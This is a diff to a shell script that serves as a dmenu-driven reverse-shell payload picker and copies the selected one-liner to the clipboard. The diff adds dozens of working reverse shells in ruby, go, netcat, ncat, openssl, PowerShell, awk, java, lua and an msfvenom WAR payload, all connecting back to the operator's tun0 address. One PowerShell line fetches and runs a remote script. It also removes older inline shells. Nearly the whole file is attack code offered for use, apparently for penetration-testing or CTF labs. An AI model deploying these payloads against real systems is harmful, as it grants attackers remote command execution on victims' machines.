@@ -53,6 +53,32 @@ phplin7_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);\$proc=proc_open
 ## ruby
 rubylin1_shell="ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'"
 rubylin2_shell="ruby -rsocket -e 'exit if fork;c=TCPSocket.new("\""$tun0_ip"\"","\""$port"\"");while(cmd=c.gets);IO.popen(cmd,"\""r"\""){|io|c.print io.read}end'"
+rubywin1_shell="ruby -rsocket -e 'c=TCPSocket.new("\""$tun0_ip"\"","\""$port"\"");while(cmd=c.gets);IO.popen(cmd,"\""r"\""){|io|c.print io.read}end'"
+## go
+golanglin1_shell="echo 'package main;import"\""os/exec"\"";import"\""net"\"";func main(){c,_:=net.Dial("\""tcp"\"","\""$tun0_ip:$port"\"");cmd:=exec.Command("\""/bin/sh"\"");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+## nc
+nc1_shell="nc -e /bin/sh $tun0_ip $port"
+nc2_shell="nc -c sh $tun0_ip $port"
+nc3_shell="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f"
+ncat1_shell="ncat $tun0_ip $port -e /bin/bash"
+ncatudp1_shell="ncat --udp $tun0_ip $port -e /bin/bash"
+## openssl
+openssl1_shell="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $tun0_ip:$port > /tmp/s; rm /tmp/s"
+## powershell
+powershell1_shell="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("\""$tun0_ip"\"",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + "\""PS "\"" + (pwd).Path + "\""> "\"";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+powershell2_shell="powershell -nop -c "\""\$client = New-Object System.Net.Sockets.TCPClient('$tun0_ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"\"""
+powershell3_shell="powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
+## awk
+awk1_shell="awk 'BEGIN {s = "\""/inet/tcp/0/$tun0_ip/$port"\""; while(42) { do{ printf "\""shell>"\"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "\""exit"\"") close(s); }}' /dev/null"
+## java
+javalin1_shell="r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()"
+javawin1_shell="String host="\""$tun0_ip"\"";\nint port=$port;\nString cmd="\""cmd.exe"\"";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+javastealth1_shell="Thread thread = new Thread(){\npublic void run(){\n// Reverse shell here\n}\n}\nthread.start();"
+## war
+war1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f war > reverse.war"
+## lua
+lua1lin_shell="lua -e "\""require('socket');require('os');t=socket.tcp();t:connect('$tun0_ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');"\"""
+lua2x_shell="lua5.1 -e 'local host, port = "$tun0_ip", $port local socket = require("\""socket"\"") local tcp = socket.tcp() local io = require("\""io"\"") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "\""r"\"") local s = f:read("\""*a"\"") f:close() tcp:send(s) if status == "\""closed"\"" then break end end tcp:close()'"
 
 # ---
 
@@ -82,13 +108,40 @@ phplin5_text="ph5 (passthru) -> $phplin5_shell"
 phplin6_text="ph6 (popen) -> $phplin6_shell"
 phplin7_text="ph7 (proc_open) -> $phplin7_shell"
 ## ruby
-rubylin1_text="rbl1 -> $rubylin1_shell"
+rubylin1_text="rbl1 (default)" # with %d dmenu would be buggy(replaced %d with 0)
 rubylin2_text="rbl2 -> $rubylin2_shell"
+rubywin1_text="rbw1 -> $rubywin1_shell"
+## go
+golanglin1_text="gol1 -> $golanglin1_shell"
+## nc
+nc1_text="nc1 (-e) -> $nc1_shell"
+nc2_text="nc2 (-c) -> $nc2_shell"
+nc3_text="nc3 (long) -> $nc3_shell"
+ncat1_text="ncat (-e) -> $ncat1_shell"
+ncatudp1_text="ncat (udp) -> $ncatudp1_shell"
+## openssl
+openssl1_text="ossl -> $openssl1_shell"
+## powershell
+powershell1_text="ps1 (rev "\""'s + percent symbol(buggy in dmenu))"
+powershell2_text="ps2 (rev ' + percent symbol(buggy in dmenu))"
+powershell3_text="ps3 (download file) -> $powershell3_shell"
+## awk
+awk1_text="awk1 -> $awk1_shell"
+## java
+javalin1_text="jvl1 (multi line (3))"
+javawin1_text="jvw1 (multi line (4))"
+javastealth1_text="jvs1 (stealth (threaded), multi line (6))"
+## war
+war1_text="war1 (msfvenom) -> $war1_shell"
+## lua
+lua1lin_text="lua1l (linux only) -> $lua1lin_shell"
+lua2x_text="lua2x (both platforms (win & lin)) -> $lua2x_shell"
+
 
 # ---
 
 # The Juicy part
-case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\nnc(long)\\nnc(-e)\\npython\\nphp\\nperl\\nruby\\njava" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
+case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
 
     ## bash
     "$bashtcp1_text") echo -n "$bashtcp1_shell" | xclip -selection clipboard ;;
@@ -119,35 +172,42 @@ case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\
     "$phplin6_text") echo -n "$phplin6_shell" | xclip -selection clipboard ;;
     "$phplin7_text") echo -n "$phplin7_shell" | xclip -selection clipboard ;;
 
-    ## ruby(buggy(port) cuz dmenu doesnt like %d's xdd)
+    ## ruby(1st -> buggy(port) cuz dmenu doesnt like %d's xdd)
     "$rubylin1_text") echo -n "$rubylin1_shell" | xclip -selection clipboard ;;
+    "$rubylin2_text") echo -n "$rubylin2_shell" | xclip -selection clipboard ;;
+    "$rubywin1_text") echo -n "$rubywin1_shell" | xclip -selection clipboard ;;
 
-    ## deprecated
-    "nc(long)") echo -n \
-        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f" \
-        | xclip -selection clipboard ;;
+    ## go
+    "$golanglin1_text") echo -n "$golanglin1_shell" | xclip -selection clipboard ;;
+    
+    ## nc
+    "$nc1_text") echo -n "$nc1_shell" | xclip -selection clipboard ;;
+    "$nc2_text") echo -n "$nc2_shell" | xclip -selection clipboard ;;
+    "$nc3_text") echo -n "$nc3_shell" | xclip -selection clipboard ;;
+    "$ncat1_text") echo -n "$ncat1_shell" | xclip -selection clipboard ;;
+    "$ncatudp1_text") echo -n "$ncatudp1_shell" | xclip -selection clipboard ;;
 
-    "nc(-e)") echo -n \
-        "nc -e /bin/sh $tun0_ip $port" \
-        | xclip -selection clipboard ;;
+    ## openssl
+    "$openssl1_text") echo -n "$openssl1_shell" | xclip -selection clipboard ;;
 
-    "python") echo -n \
-        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'" \
-        | xclip -selection clipboard ;;
+    ## powershell
+    "$powershell1_text") echo -n "$powershell1_shell" | xclip -selection clipboard ;;
+    "$powershell2_text") echo -n "$powershell2_shell" | xclip -selection clipboard ;;
+    "$powershell3_text") echo -n "$powershell3_shell" | xclip -selection clipboard ;;
 
-    "php") echo -n \
-        "php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'" \
-        | xclip -selection clipboard ;;
+    ## awk
+    "$awk1_text") echo -n "$awk1_shell" | xclip -selection clipboard ;;
 
-    "perl") echo -n \
-        "perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'" \
-        | xclip -selection clipboard ;;
+    ## java
+    "$javalin1_text") echo -n "$javalin1_shell" | xclip -selection clipboard ;;
+    "$javawin1_text") echo -n "$javawin1_shell" | xclip -selection clipboard ;;
+    "$javastealth1_text") echo -n "$javastealth1_shell" | xclip -selection clipboard ;;
 
-    "ruby") echo -n \
-        "ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'" \
-        | xclip -selection clipboard ;;
+    ## war
+    "$war1_text") echo -n "$war1_shell" | xclip -selection clipboard ;;
 
-    "java") echo -n \
-        "r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()" \
-        | xclip -selection clipboard ;;
+    ## lua
+    "$lua1lin_text") echo -n "$lua1lin_shell" | xclip -selection clipboard ;;
+    "$lua2x_text") echo -n "$lua2x_shell" | xclip -selection clipboard ;;
+
 esac
